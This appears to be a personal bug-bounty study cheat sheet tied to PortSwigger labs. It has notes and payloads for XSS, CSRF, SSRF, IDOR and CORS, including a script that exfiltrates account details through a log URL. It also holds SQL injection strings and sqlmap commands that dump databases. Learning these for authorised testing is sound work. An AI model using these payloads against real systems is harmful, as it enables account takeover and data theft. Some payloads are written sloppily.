# bug hunter  
#  Working tips 
### finding 
```text
1. Find good program 
	- can communicate with team
	- active (see last reports)   
 
2. Write notes when hack 
3. Check previous bugs of that program
4. Exploit & PoC
```  
### attack 
1. Get a feel 
2. Expand 
3. Repeat: same program but new code can still have mistakes
# Crypto 
sometimes, id,pass can be of a hash and is reversible 
### md5  
[MD5 reverse for eccbc87e4b5ce2fe28308fd9f2a7baf3](https://md5.gromweb.com/?md5=eccbc87e4b5ce2fe28308fd9f2a7baf3)
[MD5 Hash Generator](https://www.md5hashgenerator.com/)
# Networking  
[[networking]] 
- hosts file: a DNS on OS, no need since lookup DNS is possible, but still useful if wanna customize mapping name -> IP 
-> take place before DNS lookup  
- origin, same or not [Origin - MDN Web Docs Glossary: Definitions of Web-related terms | MDN](https://developer.mozilla.org/en-US/docs/Glossary/Origin) 
-> SOP: same origin policy
- CORS of a server: decide which origin can fetch current server  
-> if CORS not configured, can fetch freely  
- preflight http 

- 192.168.... [Parts of the IPv4 Address (System Administration Guide: IP Services)](https://docs.oracle.com/cd/E19683-01/806-4075/ipref-1/index.html)
- cURL and browser diff when sending requests: 
browser send cookies
# Javascript 
```js 
document.write("</script>") //not display in HTML  
document.write("<script>") //not display in HTML  

document.write("<script>alert(0)</script>") // possible
document.write("asdfjasdfk")  // possible

# AJAX  
<script> 
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true); 
req.withCredentials = true; 
req.send(); 
function reqListener() { 
location='/log?key='+this.responseText; 
					   };
```
- eval execute a js script  

# Tools 
[Your Bug Bounty ToolKit | Guides on BugBountyHunter.com](https://www.bugbountyhunter.com/guides/?type=bugbounty_toolkit)
### Burp 
- Intruder: mass requests with vary payload   
- Repeater: simple request
- Proxy

# Vulnerabilities
# XSS    
```html
<img src=1 onerror="alert"/>  
<script>alert</script> 
<a href="javascript:alert(1)"></a> 
print() # due to chrome omit alert


use iframe to xss on a server 
<iframe src="https://0a3900d0039be71ec3f57bc6004200dd.web-security-academy.net/#" onload="this.src+=<img onerror="alert(1)"/>"></iframe> 

old jquery selector convert string to dom 
$(‘<p>something</p>’);
```
[What is cross-site scripting (XSS) and how to prevent it? | Web Security Academy](https://portswigger.net/web-security/cross-site-scripting)
- bypass 
[https://d3adend.org/xss/ghettoBypass](https://d3adend.org/xss/ghettoBypass) 
despite many tries, still `&lt;script&gt; or %3Cscript%3E` -> invulnerable 
[filter bypass xss](https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet) 
[same above portswigger ver](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
![[Pasted image 20230126210840.png]]
### types  
- reflected: request & response 
- stored: server database 
- dom: client-side   
### some tags  & nitty gritty
- innerhtml, script not works but img does  
- hashchange

# CSRF   
> only applied when user logged in 
- make request (through form)
- if when request,user has a cookie     
-> user data is accessible!   
[CSRF Simple PoC Generator](https://khuongduy354.github.io/csrf-poc-generator.github.io/)
### defense
- referer
- csrf token
- samesite cookie
[What is CSRF (Cross-site request forgery)? Tutorial & Examples | Web Security Academy](https://portswigger.net/web-security/csrf) 
# SSRF & Open url redirect 
>only works if redirect link is controllable

 **for Oauth**:
- very similar to csrf, but instead of custom request, it's chaining the request from OAuth to outside 
- contains token     
[page 25 for encodes](https://www.bugbountyhunter.com/methodology/zseanos-methodology.pdf) 
[Open redirection (reflected) - PortSwigger](https://portswigger.net/kb/issues/00500100_open-redirection-reflected)  
####  SSRF  
> cause a server to make a request, especially the server's internal system    
- for e.g: server fetch external url 
- change that url to http://localhost/admin   
```c++ 
//change port and address too
192.168.0.2:8080/admin 
192.168.0.3:8080/admin 
192.168.0.2:1000/admin
```
- may lookout for redirect too  
# File upload  
- allow upload image extension  
- but: zseano.php/.jpg, server view as valid but load .php instead of image -> remote code execution  
- page 27 zeno method

# IDORS
- user/1 -> user/2, BOOM, user 2 is now accessible 
- check for  JSON too  `{"example":"example","id":"1"}` , just add random ID number  w
 
# CORS   
> applied when user logged in, and other signs below
- when response have 
"Access-Control-Allow-Credentials: true"
-> mean api_key, cookie, session_id is showed in js   
- when response have 
 “Access-Control-Allow-Origin: theirdomain.com” 
- to bypass make request with anythingheretheirdomain.com    
### tips 
- see request script above
 - page 32  
 

# SQL    injection 
```sql 
--check if injectable
' or sleep(15) and 1=1#
' or sleep(15)#
' union select sleep(15),null#
```
[Site Unreachable](https://www.w3schools.com/sql/sql_injection.asp)
```sql
SELECT password FROM admins WHERE username='admin' UNION SELECT '123' AS password# 
--AS password not needed, cuz password specified be4

admin' UNION SELECT '123' AS password#
--in sql, if SELECT CONSTANT AS password means
--populate the value 

--password field:
1234' or 1=1--

``` 
sqlmap is a beast!  
```bash 
sqlmap -u http://34.74.105.127/239c7507f5/login --method POST --data "username=FUZZ&password=" -p username --dbs --dbms mysql --regexp "invalid password" --level 2 --dump --random-agent 
sqlmap -r request.txt -p username --dbs ... (like above)  

-p : vary parameter   
--dump: save results  
--level: levels of tests to perform
``` 

# bug bounty journey
--- 
# Refererences 




2023 01 17 22:06
#cheatsheet   [[hacking]] [[javascript]]  [[networking]] 